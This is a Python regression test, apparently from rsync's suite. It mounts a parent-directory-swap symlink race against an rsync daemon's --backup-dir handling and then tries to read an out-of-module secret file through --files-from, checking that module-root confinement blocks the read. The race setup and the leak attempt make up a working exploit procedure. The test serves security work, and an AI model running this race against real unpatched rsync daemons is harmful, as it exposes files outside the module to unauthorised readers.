import os
import subprocess
import time

from rsyncfns import (
    SCRATCHDIR, race_budget, find_attacker_uid, rmtree, rsync_argv,
    start_c_flipper, stop_flipper, test_fail, test_skipped, start_test_daemon,
    write_daemon_conf,
)

# A daemon serving a writable, non-chrooted module creates --backup-dir backups
# with its own (root) ownership.  A parent-swap race can leave a root-owned
# backup symlink whose target escapes the module.  Because open_no_attacker_symlinks()
# follows a symlink owned by uid 0 / the euid, a later --files-from=:LIST that names
# that backup symlink would read an out-of-module file's content as the file list --
# unless the files-from open is module-root confined.  RED before that confinement,
# GREEN after.

PORT = 13333

if os.geteuid() != 0:
    test_skipped("requires root to plant a backup-dir symlink owned by a non-self uid")

ATT_UID = find_attacker_uid()
if ATT_UID is None:
    test_skipped("no untrusted-uid user available for cross-uid plant")

SECRET = "NO_ONE_SHOULD_README\n"
NFILES = 80
root = SCRATCHDIR / 'files-from'
root.mkdir()
base = root / 'base'
outside = base / 'outside'
src = base / 'src'
dest = base / 'dest'
backup = base / 'backup'
sub = backup / 'sub'
sublink = backup / '.sublink'
files_from = ""

secret = root / 'secret'
secret.write_text(SECRET)


def build():
    """Reset the workspace.  Call only while the flipper is stopped."""
    rmtree(base)
    for d in (src / 'sub', dest / 'sub', backup, outside):
        d.mkdir(parents=True, exist_ok=True)

    # Distinct source and destination symlink values so each transfer overwrites
    # the destination symlink and thus triggers a backup of the old one.
    for i in range(NFILES):
        (src / 'sub' / f'f{i}').symlink_to('test')
        (dest / 'sub' / f'f{i}').symlink_to(f'{secret}')
        os.lchown(src / 'sub' / f'f{i}', ATT_UID, ATT_UID)
        os.lchown(dest / 'sub' / f'f{i}', ATT_UID, ATT_UID)

    # The attacker-owned parent-swap target: a symlink to the outside directory.
    os.symlink(str(outside), sublink)
    os.lchown(sublink, ATT_UID, ATT_UID)
    sub.mkdir(parents=True, exist_ok=True)


def push():
    """Blocking rsync push that backs up the old destination symlinks."""
    return subprocess.run(
        rsync_argv('-a', '-b', '--backup-dir=/backup/',
                   f'{src}/', f'rsync://127.0.0.1:{PORT}/m/dest/'),
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def leak():
    """Attempt to read a secret via files-from through the root-owned symlink."""
    proc = subprocess.run(
        rsync_argv('-a', f'--files-from=:backup/sub/{files_from}',
                   f'rsync://127.0.0.1:{PORT}/m/', f'{dest}/'),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    if "NO_ONE_SHOULD" in proc.stdout:
        test_fail(f"{secret.name} is leaked!\n\nOutput: {proc.stdout}")


def normalize_sub():
    """If the flipper stopped with `sub` as the attacker symlink while the real
    backup directory sits at `.sublink`, put the real dir back at `sub` so the
    daemon path backup/sub/<name> (and our scandir) see the real backups.

    Best-effort only: the non-atomic (non-Linux) flipper swaps via a `sub.flip`
    scratch name and can be killed mid-rename, leaving `sub` absent or the real
    dir parked at `.flip`.  Any state we can't cleanly settle is left as-is and
    treated by the caller as 'no win this round'."""
    try:
        if sub.is_symlink() and sublink.is_dir() and not sublink.is_symlink():
            sub.unlink()
            sublink.rename(sub)
    except OSError:
        pass


def root_owned_backup_symlink():
    """Return the name of a root-owned backup symlink directly in `sub`, or "".

    Never raises: a swap killed mid-rename can leave `sub` absent or a symlink,
    which just means no usable win this round -- the caller rebuilds and retries."""
    normalize_sub()
    try:
        if sub.is_symlink() or not sub.is_dir():
            return ""
        with os.scandir(sub) as it:
            for entry in it:
                if entry.is_symlink() and entry.stat(follow_symlinks=False).st_uid == 0:
                    return entry.name
    except (FileNotFoundError, NotADirectoryError):
        return ""
    return ""


# Positive control: a clean run (no flipper) must back the old destination
# symlink into the backup tree, proving this transfer shape exercises the backup
# symlink path.  A broken fixture or an rsync that errors early fails here loudly
# instead of passing the race vacuously.
conf = write_daemon_conf(
    [('m', {'path': str(base), 'read only': 'no', 'use chroot': 'no'})],
    name='files-from-rsyncd.conf',
)
start_test_daemon(conf, PORT)

build()
proc = push()
if proc.returncode != 0:
    test_fail(f"positive control: clean --backup-dir run failed (rc={proc.returncode})")
if not (sub / 'f0').is_symlink() or os.readlink(sub / 'f0') != f'{secret}':
    test_fail(
        "positive control: the old destination symlink was not backed up into "
        f"{sub}; the backup symlink path was not exercised"
    )


# ---- THE LIVE RACE ---------------------------------------------------------
# Repeatedly push under the parent-swap flipper until a root-owned backup symlink
# lands in `sub`.  Reset the workspace only while the flipper is quiet so build()'s
# rmtree/mkdir can't race the swapper.

deadline = time.monotonic() + race_budget(10.0)
flip = None
try:
    while time.monotonic() < deadline:
        if flip is not None:
            stop_flipper(flip)
            flip = None

        files_from = root_owned_backup_symlink()
        if files_from:
            break

        build()
        flip = start_c_flipper(sub, sublink)
        push()
finally:
    if flip is not None:
        stop_flipper(flip)

if not files_from:
    # The leak needs a root-owned backup symlink, which only appears when the
    # parent-swap race makes make_backup() fall back to creating the symlink
    # itself.  Winning that window reliably needs the atomic renameat2(EXCHANGE)
    # flipper (Linux); on platforms that fall back to the non-atomic flipper the
    # window may never be hit within the budget.  Can't mount the attack here, so
    # there's nothing to assert -- skip rather than fail.
    test_skipped("race did not produce a root-owned backup symlink (no atomic flipper?)")

# Non-vacuous GREEN precondition: the symlink we exploit must genuinely target a
# secret OUTSIDE the module, so marker-absence proves module-root confinement
# refused it -- not that the attack was never mounted.
tgt = os.readlink(sub / files_from)
if os.path.realpath(tgt) != os.path.realpath(str(secret)):
    test_fail(f"setup failed: backup symlink {files_from} -> {tgt}, not the out-of-module secret")

leak()
